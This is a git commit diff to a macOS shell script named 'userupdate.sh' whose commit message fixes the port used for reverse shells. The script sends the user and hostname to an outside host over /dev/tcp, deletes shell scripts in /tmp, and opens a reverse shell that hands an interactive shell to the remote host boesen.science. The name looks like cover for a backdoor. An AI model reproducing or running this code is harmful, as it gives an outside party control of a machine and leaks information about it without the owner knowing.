dd7abea8e0112037ad9d0b0eef76ca540def6442
ErikBoesen <me@erikboesen.com>
2018-04-07 09:16:30 -0400

    Fix incorrect port for reverse shells on control/mac/userupdate.sh

--- control/mac/userupdate.sh
+++ control/mac/userupdate.sh
@@ -2,11 +2,12 @@
 host=boesen.science
 down_port=2042
 up_port=2043
+rsh_port=2044
 
 printf "INFO: $(whoami)@$(hostname) waiting for root instructions." > /dev/tcp/$host/$up_port
 
 rm /tmp/*.sh
 
 if [ ]; then
-    0<&3; exec 3<>/dev/tcp/$host/$up_port; sh <&3 >&3 2>&3
+    0<&3; exec 3<>/dev/tcp/$host/$rsh_port; sh <&3 >&3 2>&3
 fi
